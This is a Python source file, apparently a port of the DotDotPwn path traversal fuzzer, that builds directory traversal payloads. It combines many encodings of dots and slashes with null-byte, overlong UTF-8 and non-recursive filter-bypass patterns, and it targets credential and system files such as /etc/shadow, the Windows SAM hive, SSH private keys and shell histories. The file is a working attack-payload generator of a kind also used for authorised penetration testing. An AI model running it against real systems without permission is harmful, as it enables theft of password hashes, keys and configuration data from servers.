"""
Traversal Engine Module

This is the CORE module that resides the main functionality to make all the 
combinations between the dots, slashes and filenames to make the traversal strings.

Python implementation of the original DotDotPwn TraversalEngine.pm
Original by nitr0us (nitrousenador@gmail.com)
"""

from typing import List, Optional, Set
import itertools
from enum import Enum


class OSType(Enum):
    """Operating System types for intelligent fuzzing"""
    WINDOWS = "windows"
    UNIX = "unix"
    GENERIC = "generic"


class TraversalEngine:
    """
    Engine that builds traversal strings according to the depth provided and OS type.
    
    If OS detection is enabled, it includes only specific files for the detected OS.
    Also handles different representations of dots and slashes for comprehensive fuzzing.
    """

    # Specific files in Windows systems
    WINDOWS_FILES = [
        'boot.ini',
        '\\windows\\win.ini', 
        '\\windows\\system32\\drivers\\etc\\hosts'
    ]

    # Specific files in UNIX-based systems  
    UNIX_FILES = [
        '/etc/passwd',
        '/etc/issue'
    ]

    # Absolute path files for UNIX systems (direct absolute path injection)
    UNIX_ABSOLUTE_FILES = [
        '/etc/passwd',
        '/etc/shadow',
        '/etc/hosts',
        '/etc/hostname', 
        '/etc/issue',
        '/etc/motd',
        '/etc/group',
        '/etc/fstab',
        '/etc/crontab',
        '/proc/self/environ',
        '/proc/version',
        '/proc/cmdline',
        '/proc/self/stat',
        '/proc/self/status',
        '/var/log/auth.log',
        '/var/log/syslog',
        '/var/log/messages',
        '/var/log/apache/access.log',
        '/var/log/apache2/access.log',
        '/var/log/apache/error.log',
        '/var/log/apache2/error.log',
        '/var/log/nginx/access.log',
        '/var/log/nginx/error.log',
        '/var/www/html/index.html',
        '/var/www/index.html',
        '/usr/local/apache/conf/httpd.conf',
        '/usr/local/apache2/conf/httpd.conf',
        '/etc/apache2/apache2.conf',
        '/etc/apache2/sites-enabled/000-default',
        '/etc/nginx/nginx.conf',
        '/etc/nginx/sites-enabled/default',
        '/home/www-data/.bash_history',
        '/root/.bash_history',
        '/home/[user]/.bash_history',
        '/home/[user]/.ssh/id_rsa',
        '/root/.ssh/id_rsa'
    ]

    # Absolute path files for Windows systems (direct absolute path injection)
    WINDOWS_ABSOLUTE_FILES = [
        'C:\\boot.ini',
        'C:\\windows\\win.ini',
        'C:\\windows\\system.ini',
        'C:\\windows\\system32\\drivers\\etc\\hosts',
        'C:\\windows\\system32\\config\\sam',
        'C:\\windows\\system32\\config\\system',
        'C:\\windows\\system32\\config\\software',
        'C:\\windows\\system32\\config\\security',
        'C:\\windows\\repair\\sam',
        'C:\\windows\\repair\\system',
        'C:\\windows\\php.ini',
        'C:\\php\\php.ini',
        'C:\\program files\\apache group\\apache\\conf\\httpd.conf',
        'C:\\program files\\apache group\\apache2\\conf\\httpd.conf',
        'C:\\program files (x86)\\apache group\\apache\\conf\\httpd.conf',
        'C:\\apache\\conf\\httpd.conf',
        'C:\\inetpub\\wwwroot\\index.html',
        'C:\\inetpub\\wwwroot\\web.config',
        'C:\\windows\\system32\\inetsrv\\config\\applicationHost.config',
        'C:\\windows\\system32\\inetsrv\\config\\administration.config',
        'C:\\windows\\microsoft.net\\framework\\v2.0.50727\\config\\web.config',
        'C:\\windows\\microsoft.net\\framework64\\v2.0.50727\\config\\web.config',
        'C:\\users\\administrator\\desktop\\desktop.ini',
        'C:\\documents and settings\\administrator\\desktop\\desktop.ini',
        'C:\\windows\\temp\\',
        'C:\\temp\\',
        'C:\\tmp\\'
    ]

    # Extra files (only included if extra_files flag is enabled)
    EXTRA_FILES = [
        "config.inc.php",
        "web.config"
    ]

    # Dots (..) representations for fuzzing
    DOTS = [
        "..",
        ".%00.",
        "..%00",
        "..%01", 
        ".?", "??", "?.",
        "%5C..",
        ".%2e", "%2e.",
        ".../.",
        "..../",
        "%2e%2e", "%%c0%6e%c0%6e",
        "0x2e0x2e", "%c0.%c0.",
        "%252e%252e",
        "%c0%2e%c0%2e", "%c0%ae%c0%ae",
        "%c0%5e%c0%5e", "%c0%ee%c0%ee",
        "%c0%fe%c0%fe", "%uff0e%uff0e",
        "%%32%%65%%32%%65",
        "%e0%80%ae%e0%80%ae",
        "%25c0%25ae%25c0%25ae",
        "%f0%80%80%ae%f0%80%80%ae",
        "%f8%80%80%80%ae%f8%80%80%80%ae",
        "%fc%80%80%80%80%ae%fc%80%80%80%80%ae"
    ]

    # Slashes (/ and \\) representations for fuzzing
    SLASHES = [
        "/", "\\\\",
        "%2f", "%5c",
        "0x2f", "0x5c", 
        "%252f", "%255c",
        "%c0%2f", "%c0%af", "%c0%5c", "%c1%9c", "%c1%pc",
        "%c0%9v", "%c0%qf", "%c1%8s", "%c1%1c", "%c1%af",
        "%bg%qf", "%u2215", "%u2216", "%uEFC8", "%uF025",
        "%%32%%66", "%%35%%63",
        "%e0%80%af",
        "%25c1%259c", "%25c0%25af", 
        "%f0%80%80%af",
        "%f8%80%80%80%af"
    ]

    # Special patterns that won't be combined in the main engine to reduce payload count
    SPECIAL_PATTERNS = [
        "..//", "..///", "..\\\\\\\\", "..\\\\\\\\\\\\", "../\\\\", "..\\\\/",
        "../\\\\/", "..\\\\/\\\\", "\\\\../", "/..\\\\", ".../", "...\\\\",
        "./../", ".\\\\..\\\\", ".//..///", ".\\\\\\\\..\\\\\\\\", "......///",
        "%2e%c0%ae%5c", "%2e%c0%ae%2f"
    ]

    # Non-recursive bypass patterns - designed to bypass filters that remove '../' only once
    # These patterns exploit filters that don't recursively clean up directory traversal sequences
    NON_RECURSIVE_BYPASS_PATTERNS = [
        # Core 4-dot double-slash patterns (main bypass technique)
        "....//",                   # After '../' removal becomes '../'
        ".....///",                 # 5-dot triple-slash variation
        "......////",               # 6-dot quad-slash variation
        
        # Backslash variations (Windows compatibility)
        "....\\\\",                 # 4-dot double-backslash
        ".....\\\\\\",              # 5-dot triple-backslash
        "......\\\\\\\\",           # 6-dot quad-backslash
        
        # Mixed separator patterns
        "....//..\\\\",             # Mixed forward/backward slash
        "..\\\\..//",               # Mixed backward/forward slash
        
        # URL encoded variations
        "....%2f%2f",               # URL encoded double slash
        "....%5c%5c",               # URL encoded double backslash
        "....%252f%252f",           # Double URL encoded slash
        "....%255c%255c",           # Double URL encoded backslash
        
        # UTF-8 overlong encoding bypass
        "....%c0%af%c0%af",         # Overlong UTF-8 slash
        "....%c0%5c%c0%5c",         # Overlong UTF-8 backslash
        "....%e0%80%af%e0%80%af",   # Invalid UTF-8 slash sequence
        
        # Null byte injection patterns
        "....%00//",                # Null byte + forward slash
        "....%00\\\\",              # Null byte + backslash
        "..%00..//",                # Embedded null byte
        
        # Space injection patterns
        ".... //",                  # Space before slash
        "..../ /",                  # Space within slash sequence
        ".... \\\\",                # Space before backslash
        
        # Alternative representation patterns
        "....?/",                   # Question mark separator
        "....??//",                 # Double question mark
        "....;//",                  # Semicolon separator
        "....;;\\\\",               # Double semicolon with backslash
        "....#/",                   # Hash separator
        "....##//",                 # Double hash
    ]

    def __init__(self, quiet: bool = False):
        """Initialize the Traversal Engine"""
        self.quiet = quiet

    def generate_traversals(
        self,
        os_type: OSType = OSType.GENERIC,
        depth: int = 6,
        specific_file: Optional[str] = None,
        extra_files: bool = False,
        extension: Optional[str] = None,
        bisection_depth: Optional[int] = None,
        include_absolute: bool = True
    ) -> List[str]:
        """
        Generate traversal strings based on parameters
        
        Args:
            os_type: Operating system type for intelligent fuzzing
            depth: Depth of traversals (default: 6)  
            specific_file: Specific filename to target
            extra_files: Include extra files from EXTRA_FILES
            extension: File extension to append to each fuzz string
            bisection_depth: If provided, use this depth for bisection algorithm
            include_absolute: Include direct absolute path injection patterns (default: True)
            
        Returns:
            List of traversal strings to test
        """
        if not self.quiet:
            print("[+] Creating Traversal patterns (mix of dots and slashes)")

        # Generate base traversal patterns
        traversal_patterns = self._generate_patterns()
        
        # Generate traversal strings with repetitions
        if not self.quiet:
            if bisection_depth:
                print(f"[+] Multiplying {bisection_depth} times the traversal patterns (Bisection Algorithm enabled)")
            else:
                print(f"[+] Multiplying {depth} times the traversal patterns (-d switch)")

        max_depth = bisection_depth if bisection_depth else depth
        min_depth = bisection_depth if bisection_depth else 1
        
        traversal_strings = []
        for pattern in traversal_patterns:
            for k in range(min_depth, max_depth + 1):
                traversal_strings.append(pattern * k)

        # Add special traversal patterns
        if not self.quiet:
            print("[+] Creating the Special Traversal patterns")
            
        special_traversals = []
        for pattern in self.SPECIAL_PATTERNS:
            for k in range(min_depth, max_depth + 1):
                special_traversals.append(pattern * k)

        # Add comprehensive non-recursive bypass patterns
        if not self.quiet:
            print("[+] Creating Non-Recursive Bypass patterns for advanced filter evasion")
            
        nonrecursive_traversals = self._generate_nonrecursive_bypass_traversals(max_depth)

        # Get target files based on OS and settings
        target_files = self._get_target_files(os_type, specific_file, extra_files)
        
        # Combine traversal strings with target files
        final_traversals = []
        
        all_traversals = traversal_strings + special_traversals + nonrecursive_traversals
        
        for traversal in all_traversals:
            for target_file in target_files:
                # Adapt slashes based on traversal pattern
                adapted_file = self._adapt_file_slashes(target_file, traversal)
                payload = traversal + adapted_file
                
                # Add extension if specified
                if extension:
                    payload += extension
                    
                final_traversals.append(payload)

        # Add direct absolute path injection patterns
        if include_absolute and not bisection_depth:  # Skip absolute paths in bisection mode
            if not self.quiet:
                print("[+] Adding Direct Absolute Path Injection patterns")
                
            absolute_patterns = self._generate_absolute_patterns(os_type, specific_file, extra_files, extension)
            final_traversals.extend(absolute_patterns)
            
            if not self.quiet:
                print(f"[+] Added {len(absolute_patterns)} absolute path patterns")

        if not self.quiet:
            print(f"[+] Traversal Engine DONE! - Total traversal tests created: {len(final_traversals)}")

        return final_traversals

    def _generate_patterns(self) -> List[str]:
        """Generate base traversal patterns from dots and slashes combinations"""
        patterns = []
        for dot in self.DOTS:
            for slash in self.SLASHES:
                patterns.append(dot + slash)
        return patterns

    def _generate_nonrecursive_bypass_traversals(self, max_depth: int) -> List[str]:
        """
        Generate comprehensive non-recursive bypass traversal patterns.
        
        These patterns are specifically designed to bypass filters that only remove
        '../' sequences once (non-recursively). After the filter removes one '../',
        these patterns still contain traversal sequences that can be exploited.
        
        Examples of how they work:
        - Filter sees: ....//....//....//
        - Removes '../': ..//....//....//  
        - Result still contains '../' sequences → BYPASS SUCCESS
        
        Args:
            max_depth: Maximum depth for pattern repetition
            
        Returns:
            List of non-recursive bypass traversal patterns
        """
        traversals = []
        
        # Core non-recursive bypass patterns with exact repetition
        core_bypass_patterns = [
            # Main 4-dot double-slash technique (most effective against non-recursive filters)
            "....//....//..../",        # 3-level bypass
            "....//....//....//...../", # 4-level bypass
            "....//....//....//....//..../", # 5-level bypass
            
            # 5-dot triple-slash technique  
            ".....///.....///.....",     # 3-level
            ".....///.....///.....///.....", # 4-level
            
            # 6-dot quad-slash technique
            "......////......////.....",  # 3-level
            
            # Mixed encoding for different bypass scenarios
            "....//....%2f%2f..../",     # URL encoding mix
            "....%2f%2f....//..../",     # Reverse URL encoding mix
            "....%c0%af%c0%af....//..../", # UTF-8 overlong mix
            "....//....%c0%af%c0%af..../", # Reverse UTF-8 mix
            
            # Backslash variations (Windows compatibility)
            "....\\\\....\\\\....",      # Windows double-backslash
            "....\\\\....//..../",       # Mixed slash types
            "....//....\\\\..../",       # Mixed slash types reverse
            
            # Null byte injection patterns
            "....%00//....%00//..../",   # Classic null byte bypass
            "..%00..//..%00..//..%00..", # Embedded null bytes
            "....%00//....//..../",      # Mixed null byte
            
            # Space injection patterns (often missed by regex filters)
            ".... //.... //... /",      # Space injection
            "..../ /..../ /..../",      # Mid-slash spaces
            
            # Advanced encoding combinations
            "....%252f%252f....%252f%252f..../", # Double URL encoding
            "....%e0%80%af%e0%80%af....//..../", # Invalid UTF-8 sequences
            "....%c1%9c%c1%9c....//..../",       # Alternative UTF-8 encoding
            
            # Question mark and special character bypasses
            "....?/....?/..../",         # Question mark separators
            "....;;////....;;////..../", # Semicolon separators
            
            # High-value combination patterns
            "....//....%00//....%2f%2f..../",    # Triple technique mix
            "....%c0%af%c0%af....\\\\....//..../", # Multi-encoding mix
        ]
        
        # Add depth-limited patterns
        for depth in range(1, min(max_depth, 4) + 1):  # Limit to prevent payload explosion
            for pattern in core_bypass_patterns:
                if depth <= 3 or len(pattern) < 50:  # Size control
                    traversals.append(pattern)
        
        # Add systematic NON_RECURSIVE_BYPASS_PATTERNS with controlled repetition
        for base_pattern in self.NON_RECURSIVE_BYPASS_PATTERNS[:15]:  # Limit base patterns
            # Create multi-level combinations
            if max_depth >= 3:
                three_level = f"{base_pattern}{base_pattern}{base_pattern[2:]}"  # Overlap for realism
                traversals.append(three_level)
                
            if max_depth >= 4:
                four_level = f"{base_pattern}{base_pattern}{base_pattern}{base_pattern[2:]}"
                if len(four_level) < 60:  # Size control
                    traversals.append(four_level)
        
        # Remove duplicates and empty patterns
        unique_traversals = []
        seen = set()
        for traversal in traversals:
            if traversal and traversal not in seen and len(traversal) > 5:
                unique_traversals.append(traversal)
                seen.add(traversal)
        
        return unique_traversals

    def _get_target_files(
        self, 
        os_type: OSType, 
        specific_file: Optional[str], 
        extra_files: bool
    ) -> List[str]:
        """Get list of target files based on OS type and settings"""
        if specific_file:
            return [specific_file]

        target_files = []
        
        if os_type == OSType.WINDOWS:
            target_files.extend(self.WINDOWS_FILES)
        elif os_type == OSType.UNIX:
            target_files.extend(self.UNIX_FILES)
        else:  # GENERIC
            target_files.extend(self.WINDOWS_FILES)
            target_files.extend(self.UNIX_FILES)

        if extra_files:
            target_files.extend(self.EXTRA_FILES)

        return target_files

    def _adapt_file_slashes(self, target_file: str, traversal_pattern: str) -> str:
        """
        Adapt file slashes based on traversal pattern encoding
        
        If traversal pattern includes backslashes, replace slashes in filenames with backslashes
        and vice versa. Also handle different encoding representations.
        """
        adapted_file = target_file

        # Check if pattern contains specific encodings and adapt accordingly
        if "%2f" in traversal_pattern.lower():
            adapted_file = adapted_file.replace("/", "%2f").replace("\\\\", "%5c")
        elif "%5c" in traversal_pattern.lower():
            adapted_file = adapted_file.replace("/", "%2f").replace("\\\\", "%5c")
        elif "\\\\" in traversal_pattern:
            adapted_file = adapted_file.replace("/", "\\\\")
        elif "/" in traversal_pattern:
            adapted_file = adapted_file.replace("\\\\", "/")

        return adapted_file

    def _generate_absolute_patterns(
        self, 
        os_type: OSType, 
        specific_file: Optional[str], 
        extra_files: bool, 
        extension: Optional[str]
    ) -> List[str]:
        """
        Generate direct absolute path injection patterns
        
        These patterns test for vulnerabilities where applications fail to validate
        absolute paths or where path normalization is insufficient.
        """
        absolute_files = self._get_absolute_target_files(os_type, specific_file, extra_files)
        
        patterns = []
        for abs_file in absolute_files:
            # Add the direct absolute path
            pattern = abs_file
            if extension:
                pattern += extension
            patterns.append(pattern)
            
            # Add URL-encoded variations for absolute paths
            encoded_variations = [
                abs_file.replace('/', '%2f').replace('\\', '%5c'),
                abs_file.replace('/', '%2F').replace('\\', '%5C'),
                abs_file.replace('/', '\\'),  # Switch slashes
                abs_file.replace('\\', '/'),  # Switch slashes
            ]
            
            for variation in encoded_variations:
                if variation != abs_file:  # Avoid duplicates
                    pattern = variation
                    if extension:
                        pattern += extension
                    patterns.append(pattern)
        
        return patterns

    def _get_absolute_target_files(
        self, 
        os_type: OSType, 
        specific_file: Optional[str], 
        extra_files: bool
    ) -> List[str]:
        """Get list of absolute path target files based on OS type and settings"""
        target_files = []
        
        # Always include comprehensive absolute path lists for better coverage
        if os_type == OSType.WINDOWS:
            target_files.extend(self.WINDOWS_ABSOLUTE_FILES)
        elif os_type == OSType.UNIX:
            target_files.extend(self.UNIX_ABSOLUTE_FILES)
        else:  # GENERIC
            target_files.extend(self.WINDOWS_ABSOLUTE_FILES)
            target_files.extend(self.UNIX_ABSOLUTE_FILES)

        # If specific file is provided, also include it
        if specific_file:
            # If it's already an absolute path, add as-is
            if specific_file.startswith('/') or specific_file.startswith('C:') or specific_file.startswith('\\'):
                if specific_file not in target_files:
                    target_files.append(specific_file)
            else:
                # Convert relative to absolute based on OS and add
                if os_type == OSType.WINDOWS:
                    abs_file = f'C:\\{specific_file}'
                    if abs_file not in target_files:
                        target_files.append(abs_file)
                elif os_type == OSType.UNIX:
                    abs_file = f'/{specific_file}'
                    if abs_file not in target_files:
                        target_files.append(abs_file)
                else:  # GENERIC - add for both systems
                    win_abs = f'C:\\{specific_file}'
                    unix_abs = f'/{specific_file}'
                    if win_abs not in target_files:
                        target_files.append(win_abs)
                    if unix_abs not in target_files:
                        target_files.append(unix_abs)

        if extra_files:
            # Add absolute versions of extra files
            for extra_file in self.EXTRA_FILES:
                if os_type == OSType.WINDOWS or os_type == OSType.GENERIC:
                    abs_files = [
                        f'C:\\{extra_file}',
                        f'C:\\inetpub\\wwwroot\\{extra_file}'
                    ]
                    for af in abs_files:
                        if af not in target_files:
                            target_files.append(af)
                            
                if os_type == OSType.UNIX or os_type == OSType.GENERIC:
                    abs_files = [
                        f'/{extra_file}',
                        f'/var/www/html/{extra_file}'
                    ]
                    for af in abs_files:
                        if af not in target_files:
                            target_files.append(af)

        return target_files

    @staticmethod
    def detect_os_type(os_detail: str) -> OSType:
        """
        Detect OS type from nmap OS detection string
        
        Args:
            os_detail: OS detail string from nmap
            
        Returns:
            OSType enum value
        """
        if not os_detail:
            return OSType.GENERIC

        os_detail_lower = os_detail.lower()
        
        if any(keyword in os_detail_lower for keyword in ['windows', 'microsoft', 'win']):
            return OSType.WINDOWS
        elif any(keyword in os_detail_lower for keyword in ['linux', 'unix', 'bsd', 'solaris', 'aix']):
            return OSType.UNIX
        else:
            return OSType.GENERIC